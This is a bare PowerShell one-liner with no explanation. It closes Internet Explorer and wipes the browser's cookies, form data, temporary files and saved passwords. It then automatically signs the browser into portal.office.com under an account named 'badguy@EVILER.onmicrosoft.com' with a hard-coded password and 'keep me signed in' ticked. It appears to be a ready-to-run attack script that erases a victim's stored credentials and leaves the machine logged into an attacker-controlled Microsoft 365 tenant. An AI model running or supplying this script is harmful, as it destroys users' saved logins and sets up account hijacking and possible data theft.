$Username = "badguy@EVILER.onmicrosoft.com";$Password = "Password1";$URL = "portal.office.com";Get-Process iexplore -EA SilentlyContinue | Stop-Process;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 8;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 2;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 16;rundll32.exe InetCpl.cpl, ClearMyTracksByProcess 32;$ie = New-Object -com InternetExplorer.Application;$ie.visible = $True;$ie.navigate($URL); while($ie.ReadyState -ne 4) {start-sleep -m 100};$ie.document.getElementById("cred_userid_inputtext").value= "$username";$ie.document.getElementById("cred_password_inputtext").value = "$password";$ie.document.getElementById("cred_keep_me_signed_in_checkbox").Checked = $True;while($ie.ReadyState -ne 4) {start-sleep -m 100};$ie.document.getElementById("cred_userid_inputtext").click();$ie.document.getElementById("cred_password_inputtext").click();$ie.document.getElementById("cred_sign_in_button").click();
